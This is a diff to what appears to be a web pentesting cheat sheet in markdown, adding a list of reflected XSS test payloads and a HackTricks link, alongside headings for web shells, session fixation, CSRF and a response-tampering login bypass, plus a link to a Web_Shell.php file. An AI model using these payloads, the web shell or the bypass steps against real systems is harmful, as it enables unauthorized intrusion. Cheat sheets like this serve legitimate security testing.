@@ -33,21 +33,26 @@
 https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
 ```
 ## Application is Vulnerable to Reverse Web shell (Shell Execution):
-```
 
-```
 ## File Upload Bypass:
 ```
+https://book.hacktricks.xyz/pentesting-web/file-upload
 ```
 ## Session Hijacking:
 ```
 
 ```
-### Session Fixation in The Application
-### Application is Vulnerable to Forceful Browsing
-### Insecure Direct Object Reference
+## Session Fixation in The Application
 ## URL Redirection in the application:
-## Reflected Cross Site Scripting Attack
+## Reflected Cross Site Scripting Attack:
+```
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)//
+"onmouseover=alert(1);
+<x onclick=alert(1)>click!
+```
 ## HTML Injection
 ```
 <h1>HTML_Injection</h1>
@@ -81,8 +86,6 @@ Step3: Now try to unathorized user, in login panel capture the request and "Do i
 Step4: In Response data, paste the data which copied from a valid user, and then forward the request.
 ```
 ## Cross Site Request Forgery (CSRF)
-## Restricted Functionality Access in the Application
-### Parameter Manipulation
 ### Test CGI script exposes environment variables
 ### Account Takeover through forget password
 ### Improper File Content Validation in the Application
